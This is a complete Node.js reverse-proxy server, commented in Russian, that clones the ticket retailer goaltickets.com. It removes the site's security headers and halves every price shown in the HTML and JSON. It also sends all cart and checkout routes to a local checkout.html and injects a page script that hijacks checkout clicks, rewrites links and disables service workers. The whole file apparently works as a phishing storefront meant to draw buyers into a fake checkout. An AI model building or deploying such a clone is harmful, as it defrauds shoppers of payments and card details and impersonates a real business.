const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cors = require('cors');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 8080;
const VERSION = '3.0.0'; // Версия для принудительного обновления

// Оптимизация памяти для Railway
if (process.env.NODE_ENV === 'production') {
  const v8 = require('v8');
  const heapStats = v8.getHeapStatistics();
  console.log('📊 Memory stats:', {
    totalHeapSize: Math.round(heapStats.total_heap_size / 1024 / 1024) + 'MB',
    usedHeapSize: Math.round(heapStats.used_heap_size / 1024 / 1024) + 'MB',
    heapSizeLimit: Math.round(heapStats.heap_size_limit / 1024 / 1024) + 'MB'
  });
}

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

// Увеличиваем лимит размера тела запроса для больших HTML страниц
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

app.use(cors({
  origin: true,
  credentials: true
}));

// Кэширование статических файлов
app.use(express.static('index_files', {
  maxAge: '1d',
  etag: false
}));

// Логирование только важных запросов
app.use((req, res, next) => {
  if (!req.url.includes('/cdn/') && !req.url.includes('/api/') && !req.url.includes('/.well-known/')) {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  }
  next();
});

// Graceful shutdown handling
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully');
  process.exit(0);
});

// Unhandled promise rejection handling
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Uncaught exception handling
process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
  process.exit(1);
});

// Периодическая сборка мусора для оптимизации памяти
if (process.env.NODE_ENV === 'production') {
  setInterval(() => {
    if (global.gc) {
      global.gc();
      console.log('🗑️ Garbage collection completed');
    }
  }, 30000); // Каждые 30 секунд
}

// Обработка статических файлов локально
app.get('/index_files/*', (req, res, next) => {
  next();
});

// 🎯 ПЕРЕХВАТ CHECKOUT СТРАНИЦ
app.get('/checkout*', (req, res) => {
  console.log('🎯 Checkout intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

app.get('/cart', (req, res) => {
  console.log('🎯 Cart page intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

// Перехватываем все возможные варианты checkout
app.get('*checkout*', (req, res) => {
  console.log('🎯 Checkout variant intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

// Перехватываем внешние ссылки на checkout
app.get('/checkouts/*', (req, res) => {
  console.log('🎯 External checkout intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

// Перехватываем все страницы событий
app.get('/products/*', (req, res, next) => {
  console.log('🎯 Product page intercepted:', req.url);
  next();
});

app.get('/collections/*', (req, res, next) => {
  console.log('🎯 Collection page intercepted:', req.url);
  next();
});

app.get('/events/*', (req, res, next) => {
  console.log('🎯 Event page intercepted:', req.url);
  next();
});

// Специальные маршруты для ресурсов с CORS
app.get('/cdn/fonts/*', (req, res, next) => {
  console.log('🔤 Fonts intercepted:', req.url);
  const fontProxy = createProxyMiddleware({
    target: 'https://goaltickets.com',
    changeOrigin: true,
    secure: true,
    timeout: 10000,
    onProxyRes: (proxyRes, req, res) => {
      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
      proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
      proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
      proxyRes.headers['Content-Type'] = 'font/woff2';
      proxyRes.headers['Cache-Control'] = 'public, max-age=31536000';
    }
  });
  fontProxy(req, res);
});

app.get('/cdn/shop/t/*', (req, res, next) => {
  console.log('📜 Shop scripts intercepted:', req.url);
  const scriptProxy = createProxyMiddleware({
    target: 'https://goaltickets.com',
    changeOrigin: true,
    secure: true,
    timeout: 10000,
    onProxyRes: (proxyRes, req, res) => {
      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
      proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
      proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
      proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
      proxyRes.headers['Cache-Control'] = 'public, max-age=31536000';
    }
  });
  scriptProxy(req, res);
});

// Проксируем все остальные CDN ресурсы
app.get('/cdn/*', (req, res, next) => {
  console.log('📦 CDN request intercepted:', req.url);
  next();
});

app.get('/checkouts/internal/*', (req, res, next) => {
  console.log('🔧 Internal script intercepted:', req.url);
  next();
});

app.get('/assets/*', (req, res, next) => {
  console.log('📦 Assets intercepted:', req.url);
  next();
});

app.get('/cdn/shop/*', (req, res, next) => {
  console.log('📦 Shop CDN intercepted:', req.url);
  next();
});

app.get('/cdnwidget/*', (req, res, next) => {
  console.log('📦 CDN Widget intercepted:', req.url);
  next();
});

app.get('/cdn/shopifycloud/*', (req, res, next) => {
  console.log('📦 Shopify Cloud intercepted:', req.url);
  next();
});

// Проксируем cart.js
app.get('/cart.js', (req, res, next) => {
  console.log('🛒 Cart.js intercepted:', req.url);
  next();
});

app.get('/recommendations/*', (req, res, next) => {
  console.log('🛒 Recommendations intercepted:', req.url);
  next();
});

// Обработка POST запросов (возвращаем 200 для избежания ошибок)
app.post('/api/*', (req, res) => {
  res.status(200).json({ success: true });
});

// Обработка POST запросов к корзине
app.post('/cart', (req, res) => {
  console.log('🛒 Cart POST intercepted:', req.url);
  const cartProxy = createProxyMiddleware({
    target: 'https://goaltickets.com',
    changeOrigin: true,
    secure: true,
    timeout: 15000,
    onProxyRes: (proxyRes, req, res) => {
      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
      proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
      proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
      proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
      
      if (!res.headersSent) {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res);
      }
    }
  });
  cartProxy(req, res);
});

app.post('/cart/*', (req, res) => {
  console.log('🛒 Cart action intercepted:', req.url);
  const cartProxy = createProxyMiddleware({
    target: 'https://goaltickets.com',
    changeOrigin: true,
    secure: true,
    timeout: 15000,
    onProxyRes: (proxyRes, req, res) => {
      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
      proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
      proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
      proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
      
      if (!res.headersSent) {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res);
      }
    }
  });
  cartProxy(req, res);
});

// Обработка POST запросов к checkout
app.post('/checkout*', (req, res) => {
  console.log('🎯 Checkout POST intercepted:', req.url);
  res.redirect('/checkout');
});

app.post('/.well-known/*', (req, res) => {
  res.status(200).json({ success: true });
});

// Настройка прокси для HTML страниц
const proxyOptions = {
  target: 'https://goaltickets.com',
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  timeout: 20000,
  proxyTimeout: 20000,
  onProxyReq: (proxyReq, req, res) => {
    proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.5');
    proxyReq.setHeader('Accept-Encoding', 'gzip, deflate, br');
    proxyReq.setHeader('Connection', 'keep-alive');
    proxyReq.setHeader('Cache-Control', 'no-cache');
  },
  onProxyRes: (proxyRes, req, res) => {
    // Удаляем проблемные заголовки
    delete proxyRes.headers['x-frame-options'];
    delete proxyRes.headers['content-security-policy'];
    delete proxyRes.headers['x-content-type-options'];
    delete proxyRes.headers['referrer-policy'];
    
    // Отключаем кэш для HTML
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      proxyRes.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate';
      proxyRes.headers['Pragma'] = 'no-cache';
      proxyRes.headers['Expires'] = '0';
    }
    
    // Добавляем CORS для всех ресурсов
    proxyRes.headers['Access-Control-Allow-Origin'] = '*';
    proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
    proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
    proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
    proxyRes.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Type, Date, Server, Transfer-Encoding';
    proxyRes.headers['X-Proxy-Version'] = VERSION;
    
    // Исправляем MIME типы
    if (req.url.includes('.js')) {
      proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
    }
    if (req.url.includes('.css')) {
      proxyRes.headers['Content-Type'] = 'text/css; charset=utf-8';
    }
    if (req.url.includes('.woff') || req.url.includes('.woff2') || req.url.includes('.ttf') || req.url.includes('.eot')) {
      proxyRes.headers['Content-Type'] = 'font/woff2';
    }
    
    // Перехватываем JSON ответы для изменения цен
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('application/json')) {
      let body = '';
      proxyRes.on('data', (chunk) => {
        body += chunk;
      });
      
      proxyRes.on('end', () => {
        try {
          const jsonData = JSON.parse(body);
          
          function modifyPricesInObject(obj) {
            if (typeof obj === 'object' && obj !== null) {
              for (const key in obj) {
                if (typeof obj[key] === 'string') {
                  obj[key] = obj[key].replace(/From\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, (match, price) => {
                    const cleanPrice = price.replace(/,/g, '');
                    const originalPrice = parseFloat(cleanPrice);
                    
                    if (!isNaN(originalPrice) && originalPrice > 10) {
                      const newPrice = Math.round(originalPrice / 2 * 100) / 100;
                      const formattedPrice = newPrice.toLocaleString('en-US', {
                        minimumFractionDigits: 2,
                        maximumFractionDigits: 2
                      });
                      
                      console.log(`💰 JSON price changed: From $${price} USD -> From $${formattedPrice} USD`);
                      return `From $${formattedPrice} USD`;
                    }
                    return match;
                  });
                  
                  obj[key] = obj[key].replace(/\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, (match, price) => {
                    const cleanPrice = price.replace(/,/g, '');
                    const originalPrice = parseFloat(cleanPrice);
                    
                    if (!isNaN(originalPrice) && originalPrice > 10) {
                      const newPrice = Math.round(originalPrice / 2 * 100) / 100;
                      const formattedPrice = newPrice.toLocaleString('en-US', {
                        minimumFractionDigits: 2,
                        maximumFractionDigits: 2
                      });
                      
                      console.log(`💰 JSON price changed: $${price} USD -> $${formattedPrice} USD`);
                      return `$${formattedPrice} USD`;
                    }
                    return match;
                  });
                } else if (typeof obj[key] === 'object') {
                  modifyPricesInObject(obj[key]);
                }
              }
            }
          }
          
          modifyPricesInObject(jsonData);
          
          if (!res.headersSent) {
            res.setHeader('Content-Type', 'application/json');
            res.setHeader('Content-Length', Buffer.byteLength(JSON.stringify(jsonData)));
            res.end(JSON.stringify(jsonData));
          }
        } catch (e) {
          console.error('JSON parsing error:', e);
          if (!res.headersSent) {
            res.setHeader('Content-Length', Buffer.byteLength(body));
            res.end(body);
          }
        }
      });
      
      return;
    }
    
    // Перехватываем HTML ответы для изменения цен
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      let body = '';
      proxyRes.on('data', (chunk) => {
        body += chunk;
      });
      
      proxyRes.on('end', () => {
        // Изменяем цены в HTML - делим на 2
        let modifiedBody = body;
        
        console.log('💰 Starting aggressive price modification...');
        
        // Агрессивный поиск и замена цен
        const pricePatterns = [
          { pattern: /From\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: 'From $', suffix: ' USD' },
          { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: '$', suffix: ' USD' },
          { pattern: /USD\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: 'USD $', suffix: '' },
          { pattern: /USD\s+(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: 'USD ', suffix: '' },
          { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: '', suffix: ' USD' },
          { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '$', suffix: '' }
        ];
        
        pricePatterns.forEach(({ pattern, prefix, suffix }) => {
          modifiedBody = modifiedBody.replace(pattern, (match, price) => {
            const cleanPrice = price.replace(/,/g, '');
            const originalPrice = parseFloat(cleanPrice);
            
            if (!isNaN(originalPrice) && originalPrice > 0 && originalPrice > 10) {
              const newPrice = Math.round(originalPrice / 2 * 100) / 100;
              const formattedPrice = newPrice.toLocaleString('en-US', {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2
              });
              
              console.log(`💰 Price changed: ${prefix}${price}${suffix} -> ${prefix}${formattedPrice}${suffix}`);
              return match.replace(price, formattedPrice);
            }
            return match;
          });
        });
        
        // Добавляем скрипт перехвата перед закрывающим тегом </body>
        const checkoutScript = `
          <script>
            // 🎯 CHECKOUT INTERCEPTOR v${VERSION}
            (function() {
              console.log('🎯 Checkout Interceptor v${VERSION} loaded');
              
              // Принудительное обновление кэша
              if ('caches' in window) {
                caches.keys().then(function(names) {
                  for (let name of names) {
                    caches.delete(name);
                    console.log('🗑️ Cache cleared:', name);
                  }
                });
              }
              
              function interceptCheckoutClicks() {
                document.addEventListener('click', function(event) {
                  const target = event.target;
                  const text = target.textContent?.toLowerCase() || '';
                  const href = target.href || '';
                  const form = target.closest('form');
                  
                  if (text.includes('checkout') || text.includes('купить') || 
                      text.includes('оформить') || href.includes('checkout') ||
                      target.classList.contains('checkout') || target.id.includes('checkout') ||
                      (form && form.action && form.action.includes('cart')) ||
                      href.includes('goaltickets.com/checkout') ||
                      href.includes('goaltickets.com/cart') ||
                      (href && (href.includes('/checkout') || href.includes('/cart')))) {
                    
                    console.log('🎯 Checkout button clicked:', target, 'href:', href);
                    event.preventDefault();
                    event.stopPropagation();
                    
                    const notification = document.createElement('div');
                    notification.innerHTML = \`
                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
                        Перенаправляем на checkout...
                      </div>
                    \`;
                    document.body.appendChild(notification);
                    
                    setTimeout(() => {
                      window.location.href = '/checkout';
                    }, 500);
                    
                    return false;
                  }
                });
              }
              
              function interceptForms() {
                document.addEventListener('submit', function(event) {
                  const form = event.target;
                  const action = form.action?.toLowerCase() || '';
                  
                  if (action.includes('checkout')) {
                    console.log('🎯 Checkout form submission intercepted:', form);
                    event.preventDefault();
                    event.stopPropagation();
                    
                    const notification = document.createElement('div');
                    notification.innerHTML = \`
                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
                        Обрабатываем заказ...
                      </div>
                    \`;
                    document.body.appendChild(notification);
                    
                    setTimeout(() => {
                      window.location.href = '/checkout';
                    }, 1000);
                    
                    return false;
                  }
                });
              }
              
              function interceptEventLinks() {
                document.addEventListener('click', function(event) {
                  const target = event.target;
                  const href = target.href || target.closest('a')?.href;
                  
                  if (href) {
                    if (href.includes('goaltickets.com')) {
                      console.log('🔗 Event link intercepted:', href);
                      event.preventDefault();
                      event.stopPropagation();
                      
                      const url = new URL(href);
                      const path = url.pathname + url.search + url.hash;
                      
                      window.location.href = path;
                      return false;
                    }
                    
                    if (href.includes('/products/') || href.includes('/collections/') || 
                        href.includes('/events/') || href.includes('/tickets/')) {
                      console.log('🔗 Event page link intercepted:', href);
                      event.preventDefault();
                      event.stopPropagation();
                      
                      window.location.href = href;
                      return false;
                    }
                  }
                });
                
                const allLinks = document.querySelectorAll('a[href]');
                allLinks.forEach(link => {
                  const href = link.href;
                  
                  if (href.includes('goaltickets.com')) {
                    const url = new URL(href);
                    const path = url.pathname + url.search + url.hash;
                    
                    link.href = path;
                    console.log('🔗 Link updated:', href, '->', path);
                  }
                });
              }
              
              function fixServiceWorker() {
                console.log('🔧 Fixing Service Worker...');
                if ('serviceWorker' in navigator) {
                  navigator.serviceWorker.getRegistrations().then(function(registrations) {
                    console.log('🔧 Found', registrations.length, 'service workers');
                    for(let registration of registrations) {
                      console.log('🔧 Unregistering service worker:', registration.scope);
                      registration.unregister().then(function(boolean) {
                        console.log('🔧 Service worker unregistered:', boolean);
                      });
                    }
                  });
                  
                  navigator.serviceWorker.register = function() {
                    console.log('🔧 Service Worker registration blocked');
                    return Promise.reject(new Error('Service Worker registration blocked'));
                  };
                }
              }
              
              function modifyPricesOnPage() {
                console.log('💰 Modifying prices on page...');
                
                const priceSelectors = [
                  '[class*="price"]',
                  '[class*="cost"]',
                  '[class*="amount"]',
                  '[data-price]',
                  'span:contains("$")',
                  'div:contains("USD")',
                  'p:contains("$")',
                  'h1:contains("$")',
                  'h2:contains("$")',
                  'h3:contains("$")',
                  'h4:contains("$")',
                  'h5:contains("$")',
                  'h6:contains("$")',
                  'strong:contains("$")',
                  'b:contains("$")',
                  'em:contains("$")',
                  'i:contains("$")'
                ];
                
                priceSelectors.forEach(selector => {
                  try {
                    const elements = document.querySelectorAll(selector);
                    elements.forEach(element => {
                      const text = element.textContent || element.innerText || '';
                      
                      const pricePatterns = [
                        /From\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                        /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                        /USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
                        /USD\s+(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
                        /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                        /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g
                      ];
                      
                      pricePatterns.forEach(pattern => {
                        const matches = text.match(pattern);
                        if (matches) {
                          matches.forEach(match => {
                            const priceMatch = match.match(/(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/);
                            if (priceMatch) {
                              const originalPrice = priceMatch[1];
                              const cleanPrice = originalPrice.replace(/,/g, '');
                              const priceValue = parseFloat(cleanPrice);
                              
                              if (!isNaN(priceValue) && priceValue > 0) {
                                const newPrice = Math.round(priceValue / 2 * 100) / 100;
                                const formattedPrice = newPrice.toLocaleString('en-US', {
                                  minimumFractionDigits: 2,
                                  maximumFractionDigits: 2
                                });
                                
                                const newText = text.replace(match, match.replace(originalPrice, formattedPrice));
                                element.textContent = newText;
                                console.log('💰 Client price changed:', match, '->', match.replace(originalPrice, formattedPrice));
                              }
                            }
                          });
                        }
                      });
                    });
                  } catch (e) {
                    // Игнорируем ошибки селекторов
                  }
                });
                
                const elementsWithDataPrice = document.querySelectorAll('[data-price]');
                elementsWithDataPrice.forEach(element => {
                  const price = element.getAttribute('data-price');
                  const priceValue = parseFloat(price);
                  
                  if (!isNaN(priceValue) && priceValue > 0) {
                    const newPrice = Math.round(priceValue / 2 * 100) / 100;
                    element.setAttribute('data-price', newPrice.toString());
                    console.log('💰 Data price changed:', price, '->', newPrice);
                  }
                });
              }
              
              function aggressivePriceModification() {
                console.log('💰 Aggressive price modification...');
                
                const walker = document.createTreeWalker(
                  document.body,
                  NodeFilter.SHOW_TEXT,
                  null,
                  false
                );
                
                const textNodes = [];
                let node;
                while (node = walker.nextNode()) {
                  textNodes.push(node);
                }
                
                textNodes.forEach(textNode => {
                  const text = textNode.textContent;
                  if (text && text.includes('$')) {
                    const pricePatterns = [
                      /From\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                      /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                      /USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
                      /USD\s+(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
                      /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                      /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g
                    ];
                    
                    let modifiedText = text;
                    pricePatterns.forEach(pattern => {
                      modifiedText = modifiedText.replace(pattern, (match, price) => {
                        const cleanPrice = price.replace(/,/g, '');
                        const priceValue = parseFloat(cleanPrice);
                        
                        if (!isNaN(priceValue) && priceValue > 0) {
                          const newPrice = Math.round(priceValue / 2 * 100) / 100;
                          const formattedPrice = newPrice.toLocaleString('en-US', {
                            minimumFractionDigits: 2,
                            maximumFractionDigits: 2
                          });
                          
                          console.log('💰 Aggressive price changed:', match, '->', match.replace(price, formattedPrice));
                          return match.replace(price, formattedPrice);
                        }
                        return match;
                      });
                    });
                    
                    if (modifiedText !== text) {
                      textNode.textContent = modifiedText;
                    }
                  }
                });
              }
              
              if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', function() {
                  interceptCheckoutClicks();
                  interceptForms();
                  interceptEventLinks();
                  modifyPricesOnPage();
                  fixServiceWorker();
                });
              } else {
                interceptCheckoutClicks();
                interceptForms();
                interceptEventLinks();
                modifyPricesOnPage();
                fixServiceWorker();
              }
              
              setTimeout(() => {
                interceptCheckoutClicks();
                interceptForms();
                interceptEventLinks();
                modifyPricesOnPage();
                fixServiceWorker();
              }, 2000);
              
              setTimeout(aggressivePriceModification, 1000);
              setTimeout(aggressivePriceModification, 3000);
              setTimeout(aggressivePriceModification, 6000);
            })();
          </script>
        `;
        
        // Вставляем скрипт перед </body>
        modifiedBody = modifiedBody.replace('</body>', checkoutScript + '</body>');
        
        if (!res.headersSent) {
          res.setHeader('Content-Length', Buffer.byteLength(modifiedBody));
          res.end(modifiedBody);
        }
      });
      
      return;
    }
    
    if (!res.headersSent) {
      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      proxyRes.pipe(res);
    }
  },
  onError: (err, req, res) => {
    console.error('Proxy Error:', err.message);
    if (!res.headersSent) {
      res.status(500).send('Service temporarily unavailable');
    }
  }
};

// Применяем прокси только к корневой странице
app.get('/', createProxyMiddleware(proxyOptions));

// Для всех остальных GET запросов - прокси к оригинальному сайту
app.get('*', createProxyMiddleware({
  target: 'https://goaltickets.com',
  changeOrigin: true,
  secure: true,
  timeout: 10000,
  onProxyRes: (proxyRes, req, res) => {
    proxyRes.headers['Access-Control-Allow-Origin'] = '*';
    proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
    proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
    proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
    
    if (req.url.includes('.js')) {
      proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
    }
    if (req.url.includes('.css')) {
      proxyRes.headers['Content-Type'] = 'text/css; charset=utf-8';
    }
    if (req.url.includes('.woff') || req.url.includes('.woff2') || req.url.includes('.ttf') || req.url.includes('.eot')) {
      proxyRes.headers['Content-Type'] = 'font/woff2';
    }
  },
  onError: (err, req, res) => {
    if (!res.headersSent) {
      res.status(404).send('Not found');
    }
  }
}));

// Обработка ошибок
app.use((err, req, res, next) => {
  console.error('Server Error:', err);
  res.status(500).json({ error: 'Internal Server Error' });
});

// Запуск сервера
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Proxy server v${VERSION} running on port ${PORT}`);
  console.log(`📡 Proxying requests to: https://goaltickets.com`);
  console.log(`🌐 Access your proxy at: http://localhost:${PORT}`);
});